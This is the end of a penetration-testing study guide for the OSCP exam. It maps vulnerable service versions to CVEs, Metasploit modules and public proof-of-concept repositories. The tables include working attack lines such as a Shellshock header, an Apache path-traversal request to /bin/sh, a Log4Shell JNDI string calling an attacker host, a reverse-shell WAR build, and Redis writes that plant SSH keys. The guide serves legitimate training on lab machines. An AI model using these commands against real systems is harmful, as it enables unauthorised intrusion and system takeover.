You will meet versions not in this table. **This is the repeatable process** — it's how every entry below was found, and it's what you do in the exam:
```bash
# 1) searchsploit — your OFFLINE exploit database (this alone finds ~80% of version exploits)
searchsploit <product>                 # e.g. searchsploit proftpd
searchsploit <product> <major.minor>   # narrow:  searchsploit redis 4
searchsploit -w <product>              # -w = show the exploit-db URL ; -m <id> = copy PoC locally ; -x <id> = read it
# 2) nmap's own vuln scripts (names the CVE for you)
nmap -p<port> --script vuln $IP
nmap -p<port> --script "default,safe,version" $IP
# 3) Google, in this exact shape (do this EVERY time):
#      "<product> <version>" exploit
#      "<product> <version>" rce github
#      <product> <version> CVE
#    → the top hits name the CVE AND link the PoC repo (that's how you learn "redis-rogue-server" exists)
# 4) msfconsole search (even if you won't fire it — it names modules + CVEs):
#      search <product>
# 5) The CVE → PoC jump:  you have a CVE number → google  CVE-XXXX-YYYY github poc  → clone it → READ it → run it
```
**Rule of thumb:** a service banner with a version number is a *question*: "is THIS version exploitable?" You answer it with the 5 steps above — **never assume "probably patched."** Most lab boxes run the vulnerable version on purpose.

> ⚠️ **Version strings lie (both ways).** (a) Distros **backport** security fixes while keeping the old version number — so a "vulnerable-looking" banner may be patched; always actually *try* the exploit. (b) Some patches (e.g. Redis CVE-2022-0543) **don't change the version string** — so a "safe-looking" banner may be vulnerable. The banner starts the hunt; the exploit result ends it.

---

## 🎯 THE CLASSIC BOX-KILLERS  (memorise these — they appear constantly on OSCP/PG/HTB)
These are version-exact, unauthenticated, and usually = instant foothold or root. See one → go straight for it.

| Service / banner | Vulnerable version | CVE / name | What you get | Tool / exact command |
|---|---|---|---|---|
| **vsftpd** | **2.3.4** | CVE-2011-2523 | **root shell** (backdoor) | login user ending `:)` opens port 6200 → `nc $IP 6200` then `id`. MSF: `exploit/unix/ftp/vsftpd_234_backdoor` |
| **ProFTPD** | **1.3.5 / 1.3.5a** | CVE-2015-3306 (mod_copy) | **RCE** (write webshell via SITE CPFR/CPTO) | `searchsploit proftpd` → EDB-**36742** ; MSF `exploit/unix/ftp/proftpd_modcopy_exec` |
| **ProFTPD** | **1.3.3c** | CVE-2010-3867 era backdoor | **root shell** | MSF `exploit/unix/ftp/proftpd_133c_backdoor` |
| **Samba (usermap)** | **3.0.20 – 3.0.25rc3** | CVE-2007-2447 | **root RCE** (username map script) | MSF `exploit/multi/samba/usermap_script` (username = `/bin/bash` payload) |
| **Samba (SambaCry)** | **3.5.0 → <4.4.14 / <4.5.10 / <4.6.4** | CVE-2017-7494 | **root RCE** (upload .so to a writable share → load) | MSF `exploit/linux/samba/is_known_pipename` |
| **Windows SMB (EternalBlue)** | Win7 / 2008 / 2008R2 / (XP/2003) unpatched | **MS17-010** (CVE-2017-0144) | **SYSTEM RCE** | MSF `exploit/windows/smb/ms17_010_eternalblue` ; manual: github **worawit/MS17-010** (AutoBlue) ; check: `nmap --script smb-vuln-ms17-010` |
| **Windows SMBv3 (SMBGhost)** | Win10 1903/1909, Server 1903/1909 | CVE-2020-0796 | **SYSTEM** (LPE reliable; RCE harder) | github **danigargu/CVE-2020-0796** ; check: `nmap --script smb-protocols` (SMB 3.1.1) |
| **UnrealIRCd** (6667) | **3.2.8.1** | CVE-2010-2075 | **RCE** (backdoored tarball) | MSF `exploit/unix/irc/unreal_ircd_3281_backdoor` ; manual: `AB; <cmd>` |
| **distcc** (3632) | any open distccd | CVE-2004-2687 | **RCE** as the distcc user | MSF `exploit/unix/misc/distcc_exec` |
| **Rejetto HFS** (HttpFileServer) | **2.3 / 2.3a / 2.3b** | CVE-2014-6287 | **RCE** (Windows) | `searchsploit hfs` → EDB-**39161** ; MSF `exploit/windows/http/rejetto_hfs_exec` |
| **Nostromo nhttpd** | **≤ 1.9.6** | CVE-2019-16278 | **RCE** (dir traversal) | `searchsploit nostromo` → EDB-**47837** ; MSF `exploit/multi/http/nostromo_code_exec` |
| **Webmin** (10000) | **1.890 – 1.920** | CVE-2019-15107 | **unauth RCE as root** | MSF `exploit/linux/http/webmin_backdoor` ; EDB-**47293** (pipe `|` in old-password POST) |

---

## 📡 Per-service version → exploit tables

### FTP (21)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| vsftpd 2.3.4 | CVE-2011-2523 | root backdoor (6200) | see classics above |
| ProFTPD 1.3.5/1.3.5a | CVE-2015-3306 | RCE (mod_copy) | EDB-36742 / MSF proftpd_modcopy_exec |
| ProFTPD 1.3.3c | backdoor | root | MSF proftpd_133c_backdoor |
| Any FTP | — | anon login / upload to web root | `ftp $IP` → `anonymous` ; `put shell.php` |

### SSH (22)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| OpenSSH **≤ 7.7** | CVE-2018-15473 | **username enumeration** (valid users → spray/brute) | `searchsploit openssh` → EDB-**45233** ; python PoC `ssh-username-enum` |
| libssh **0.6 – 0.8.3** | CVE-2018-10933 | **auth bypass** (send SSH2_MSG_USERAUTH_SUCCESS) | github PoCs: `libssh-auth-bypass` ; MSF `auxiliary/scanner/ssh/libssh_auth_bypass` |
| OpenSSH **8.5p1 – 9.7p1** (glibc) | CVE-2024-6387 **regreSSHion** | RCE as root (hard, niche) | github PoCs (very timing-dependent — rarely exam-relevant) |
| any | — | **key reuse / found creds** → `ssh -i key user@IP` | SSH is usually the *payoff*, not the hole |

### SMTP (25/465/587)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| Exim **4.87 – 4.91** | CVE-2019-10149 "Return of the WIZard" | **RCE as root** | `searchsploit exim` → EDB-**46974** ; local-priv-esc variant EDB-46996 |
| OpenSMTPD **< 6.6.2** | CVE-2020-7247 | **RCE as root** | `searchsploit opensmtpd` → EDB-**47984** |
| any | — | **user enumeration** (VRFY/EXPN/RCPT) | `smtp-user-enum -M VRFY -U users.txt -t $IP` |

### DNS (53)
| What | Gives | Tool |
|---|---|---|
| Zone transfer allowed | all internal records (hosts, AD) | `dig axfr @$IP domain.tld` / `fierce` |
| dnsmasq < 2.78 | CVE-2017-14491 RCE/DoS | `searchsploit dnsmasq` (rare) |
| any | subdomain/AD SRV discovery | see `[ENUM-DNS]` |

### SMB (139/445)
See **classics** (EternalBlue, SambaCry, usermap, SMBGhost). Also:
| What | Gives | Tool |
|---|---|---|
| Null/guest session | shares, users, policy | `smbclient -L //$IP -N` ; `enum4linux-ng -A $IP` ; `nxc smb $IP -u '' -p ''` |
| Writable share + `[ENUM-SMB]` | webshell / exe drop | `smbclient //$IP/share -N` → `put` |

### RDP (3389)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| Win **XP–2008R2** unpatched | CVE-2019-0708 **BlueKeep** | **SYSTEM RCE** (unstable — can BSOD) | MSF `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` ; check `nmap --script rdp-vuln-ms12-020` |
| any | — | creds → `xfreerdp /u:user /p:pass /v:$IP` | brute last resort: `hydra rdp://$IP` |

### Redis (6379)  ← *your exact pain point*
| Version / condition | CVE / name | Gives | Tool / how |
|---|---|---|---|
| **Any unauth** Redis | — | config write → **webshell / SSH key / cron** | `redis-cli -h $IP` → `config set dir ...` + `set` → write `authorized_keys` / cron / webshell. See `[ENUM-REDIS]` |
| **≥ 4.0** unauth | module-load RCE | **direct command exec** | github **n0b0dyCN/redis-rogue-server** → `MODULE LOAD` → `system.exec "id"` / `system.rev`. (searchsploit redis) |
| Debian/Ubuntu pkg (Lua) | CVE-2022-0543 | **RCE** (Lua sandbox escape) | github PoCs `CVE-2022-0543` ; works even when version *looks* patched (banner unchanged!) |
> **How you'd find this in the exam:** `searchsploit redis` + google `"redis 4" rce github` → both name redis-rogue-server. The module-load trick is the headline Redis≥4 technique — now you know it exists.

### MSSQL (1433)
| Condition | Gives | Tool |
|---|---|---|
| Creds (or `sa`) | **RCE** via `xp_cmdshell` | `impacket-mssqlclient user:pass@$IP -windows-auth` → `enable_xp_cmdshell` → `xp_cmdshell 'whoami'` |
| Service acct has SeImpersonate | → **SYSTEM** | land shell → PrintSpoofer/GodPotato `[POTATO-GOTCHAS]` |
| Trusted links | pivot to other SQL as sa | `EXEC ... AT [LINKEDSRV]` |

### MySQL / MariaDB (3306)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| MySQL **5.1.x<5.1.63 / 5.5.x<5.5.25** | CVE-2012-2122 | **auth bypass** (repeat login ~300×) | MSF `auxiliary/scanner/mysql/mysql_authbypass_hashdump` |
| creds + FILE priv | **UDF RCE** (local root if run as root) | `raptor_udf2.c` → `lib_mysqludf_sys` → `sys_exec('...')` |
| creds | loot `mysql.user` hashes, read files `LOAD_FILE()` | `mysql -h $IP -u user -p` |

### PostgreSQL (5432)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| **9.3 – 11.2** (auth'd superuser) | CVE-2019-9193 | **RCE** as postgres user | `COPY cmd_exec FROM PROGRAM 'id';` ; MSF `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` |
| any creds | read/write files, hashes | `psql -h $IP -U postgres` ; default creds `postgres:postgres` |

### MongoDB (27017) / Oracle (1521)
| What | Gives | Tool |
|---|---|---|
| MongoDB no-auth (default) | dump all DBs (creds/app data) | `mongosh --host $IP` → `show dbs` / `db.<c>.find()` |
| Oracle TNS | SID + default creds → file write/RCE | `odat all -s $IP` (sidguesser→passwordguesser→utlfile/externaltable). See `[ENUM-ORACLE]` |

### Elasticsearch (9200) / Memcached (11211)
| Version | CVE / name | Gives | Tool |
|---|---|---|---|
| ES **≤ 1.1** | CVE-2014-3120 | RCE (MVEL) | `searchsploit elasticsearch` → EDB-**33370** |
| ES **1.3.0–1.3.7 / 1.4.0–1.4.2** | CVE-2015-1427 | RCE (Groovy sandbox) | EDB-**36337** |
| ES any | — | dump indices for creds | `curl $IP:9200/_cat/indices` → `_search` |
| Memcached | — | dump cached creds/sessions | `nc $IP 11211` → `stats items`/`cachedump`/`get` |

### Tomcat / AJP / Java app servers (8080, 8009, 8443…)
| Version / what | CVE / name | Gives | Tool |
|---|---|---|---|
| Tomcat AJP **<9.0.31/<8.5.51/<7.0.100** | CVE-2020-1938 **Ghostcat** | read WEB-INF (creds) → sometimes RCE | `searchsploit ghostcat` ; github **YDHCUI/CNVD-2020-10487** |
| Tomcat Manager + creds | — | **RCE** (deploy .war) | `msfvenom -p java/jsp_shell_reverse_tcp -f war` → upload `/manager/text/deploy` (try `tomcat:tomcat`) |
| JBoss | — | **RCE** (deploy/JMX) | `jexboss -u http://$IP:8080` |
| Jenkins | Script Console / CVE-2024-23897 | **RCE** | `/script` → Groovy `"cmd".execute()` ; `searchsploit jenkins` |

### Web apps / CMS  (always run after web enum)
| Product + version | CVE / name | Gives | Tool |
|---|---|---|---|
| **Apache httpd 2.4.49 / 2.4.50** | CVE-2021-41773 / CVE-2021-42013 | path traversal → **RCE** (if cgi/`require all granted`) | `curl --path-as-is "http://$IP/cgi-bin/.%2e/%2e%2e/bin/sh"` ; `searchsploit apache 2.4.49` |
| **bash via CGI** (≤ 4.3) | CVE-2014-6271 **Shellshock** | **RCE** | `curl -H "User-Agent: () { :;}; /bin/bash -c 'id'" http://$IP/cgi-bin/<script>` ; `nmap --script http-shellshock` |
| **OpenSSL 1.0.1–1.0.1f** | CVE-2014-0160 **Heartbleed** | memory leak (creds/keys) | `nmap --script ssl-heartbleed` ; `searchsploit heartbleed` |
| **Drupal <7.58 / <8.5.1** | CVE-2018-7600 **Drupalgeddon2** | **unauth RCE** | github **dreadlocked/Drupalgeddon2** ; `searchsploit drupal` |
| **log4j 2.0-beta9 – 2.14.1** | CVE-2021-44228 **Log4Shell** | **unauth RCE** (JNDI) | github **kozmer/log4j-shell-poc** ; inject `${jndi:ldap://KALI/x}` into any logged field |
| **PHP-CGI <5.3.12/<5.4.2** | CVE-2012-1823 | **RCE** (query-string arg inject) | MSF `exploit/multi/http/php_cgi_arg_injection` |
| **phpMyAdmin 4.8.0–4.8.1** | CVE-2018-12613 | LFI → RCE | `searchsploit phpmyadmin` → EDB-**44928** |
| **Grav CMS ≤ 1.10.7** (admin) | CVE-2021-21425 | **unauth RCE** (YAML scheduler) | EDB-**49973** (`-u http://.../grav-admin/`). Box: Astronaut |
| **Subrion ≤ 4.2.1** | CVE-2018-19422 | RCE (.phar upload) | EDB-**49876** / manual .phar. Box: Exfiltrated |
| **SaltStack <2019.2.4/<3000.2** (4505/4506) | CVE-2020-11651/11652 | **unauth RCE as root** | github **jasperla/CVE-2020-11651-poc** → `--read`/`--exec`. Box: Twiggy |
| **CUPS** (631 + UDP cups-browsed) | CVE-2024-4717x | unauth RCE (niche) | github **ippsec/evil-cups**. See `[ENUM-CUPS]` |
| WordPress | plugin-specific | varies | `wpscan --url http://$IP -e vp,u --api-token <t>` → then searchsploit the plugin |

### Remote-desktop / mgmt / misc
| Service + version | CVE / name | Gives | Tool |
|---|---|---|---|
| RealVNC **4.1.1** | CVE-2006-2369 | **auth bypass** (type "none") | MSF `auxiliary/admin/vnc/realvnc_41_bypass` |
| IPMI 2.0 (623/UDP) | CVE-2013-4786 | **hash dump pre-auth** → crack | MSF `auxiliary/scanner/ipmi/ipmi_dumphashes` → `hashcat -m 7300` |
| rsync (873) no-auth | — | read/write files (keys, web root, `/`) | `rsync rsync://$IP/` → list → pull/push. See `[ENUM-RSYNC]` |
| Telnet (23) | — | default/no creds, banner leak | `telnet $IP` ; reuse any pw on SSH |

> 🔗 **Metasploit reminder (exam rule):** you may use MSF on **ONE** target only. For every entry above that names an MSF module, there is a `searchsploit`/github manual PoC alternative — prefer the manual one so you keep your single MSF use in reserve. The module name is still listed because it's the fastest way to *learn the CVE and confirm the version is the hole*.

---

# [ENUM-DECISION]  "Port X is open → go read this section"
Use your Nmap results, then jump (Ctrl+F the tag):
```
21  FTP        → [ENUM-FTP]      (anonymous? can you upload? version exploit?)
22  SSH        → [ENUM-SSH]      (have creds/keys? otherwise it's a payoff, not a way in)
25  SMTP       → [ENUM-SMTP]     (enumerate usernames)
53  DNS        → [ENUM-DNS]      (zone transfer, AD SRV records)
80/443/8080…   → [WEB-QUICK]     (Volume 2 — always enumerate web fully)
88  KERBEROS   → it's AD! → [AD-QUICK] + [ENUM-KERBEROS]
110/143 POP/IMAP → test creds, loot mailboxes
111 RPC        → showmount → NFS → [ENUM-NFS]
135 MSRPC      → rpcclient user enum → [ENUM-RPC]
139/445 SMB    → [ENUM-SMB] / [SMB-QUICK]
161 SNMP       → snmpwalk → [ENUM-SNMP]
389/636/3268 LDAP → [ENUM-LDAP] + [AD-ENUM]
623 IPMI       → [ENUM-IPMI]  (UDP — dump the hash)
631 CUPS/IPP   → [ENUM-CUPS]  (Linux printing — CVE-2024-4717x RCE, niche)
1433 MSSQL     → [ENUM-MSSQL]
1521 Oracle    → [ENUM-ORACLE]
2049 NFS       → [ENUM-NFS]
3306 MySQL     → [ENUM-MYSQL]
3389 RDP       → [ENUM-RDP]
5432 Postgres  → [ENUM-POSTGRES]
5900 VNC       → [ENUM-VNC]
5985/5986 WinRM → [ENUM-WINRM]
6379 Redis     → [ENUM-REDIS]
27017 Mongo    → [ENUM-MONGODB]
2375 Docker    → [ENUM-DOCKER]
4505/4506 SaltStack → [ENUM-SALTSTACK]  (ZeroMQ = salt-master → unauth root)
23 Telnet      → [ENUM-TELNET]
69 TFTP(udp)   → [ENUM-TFTP]
79 Finger      → [ENUM-FINGER]
110/143 POP/IMAP → [ENUM-POP-IMAP]
123 NTP(udp)   → [ENUM-NTP]
873 rsync      → [ENUM-RSYNC]
8009 AJP       → [ENUM-AJP]  (Ghostcat)
8080 Tomcat    → [ENUM-AJP]  (Manager → .war RCE)
9200 Elastic   → [ENUM-ELASTIC]
11211 Memcached → [ENUM-MEMCACHED]
anything else  → [ENUM-UNUSUAL-PORTS]
```
> 🎯 **Got a version number from `-sCV`?** Don't guess if it's exploitable — go to **`[VERSION-VULN-MAP]`** (vulnerable version → CVE → what you get → the exact tool/PoC name + how to find it).

---
*End Volume 1. Next: Volume 2 (Web & SQL Injection) — how to break the websites you just found.*
